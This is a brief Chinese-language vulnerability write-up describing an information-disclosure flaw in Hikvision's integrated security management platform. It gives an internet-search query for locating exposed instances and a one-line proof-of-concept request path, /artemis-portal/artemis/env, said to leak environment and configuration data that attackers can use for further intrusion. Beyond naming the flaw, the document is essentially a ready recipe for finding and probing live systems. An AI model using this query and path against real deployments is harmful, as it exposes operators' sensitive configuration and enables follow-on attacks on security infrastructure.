# Hikvision 综合安防管理平台 env 信息泄漏漏洞

## 漏洞描述

Hikvision 综合安防管理平台存在信息泄漏漏洞，攻击者通过漏洞可以获取环境env等敏感消息进一步攻击

## 漏洞影响

Hikvision 综合安防管理平台

## 网络测绘

```
app="Hikvision-综合安防管理平台"
```

## 漏洞复现

登录页面

![image-20220824134144287](images/202208241341481.png)

验证POC

```
/artemis-portal/artemis/env 
```

![image-20230828163057813](images/image-20230828163057813.png)